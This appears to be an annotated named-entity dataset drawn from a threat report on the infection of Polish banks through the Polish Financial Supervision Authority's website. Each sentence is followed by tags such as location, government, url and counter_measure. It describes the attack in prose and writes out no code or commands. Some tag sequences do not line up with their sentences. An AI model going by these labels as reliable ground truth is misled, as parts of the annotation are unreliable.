Preliminary investigation suggests that the starting point for the infection could have been located on the webserver of Polish financial sector regulatory body , Polish Financial Supervision Authority ( www.knf.gov.pl ).Due to a slight modification of one of the local JS files , an external JS file was loaded , which could have executed malicious payloads on selected targets .		others others others others others others others others others others others others others others others others others others location others others others others others location government government government others url others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others

While you can find some hashes at the end of this article , we gathered the available information regarding the malware itself .		others others others others others others others others others others others others others others others others others others others others others others others
While there might be some elements borrowed from other similar tools and crimeware strategies , the malware used in this attack has not been documented before .		others others others others others others others others others others others others others others others others others others others others others others others others others others others

The final payload has the functionality of a regular RAT .		others others others others others others others others others others others
While we have no idea of attackers motivation , so far we have no knowledge of any direct financial losses incurred by banks or their customers due to this attack .		others others others others others others person others others others others others others others others others others others others others others others industry others others others others others others others others
What is more troubling , some of the victims were able to identify large outgoing data transfers .		others others others others others others others others others others others others others others others others others others
So far they could not identify the contents of the data as it was encrypted .		others others others others others others others others others others others others others others others others

While this should not come as a surprise , this incident is the perfect example of the statement “ you are going to get infected ” .		others others others others others others others others others others others others others others others others others others others others others others others others others others others
Polish financial sector has some of the best people and tools in terms of security and still it looks like the attackers achieved their objectives without major hurdles in at least some cases .		location industry industry others others others others others others others others others others others others others others others others others others person others others others others others others others others others others others others
On the good side – they were detected and once notified banks were able to quickly identify infected machines and suspicious traffic patterns .		others others others others others reference_word others others others others others industry others others others others counter_measure counter_measure counter_measure counter_measure counter_measure counter_measure counter_measure others
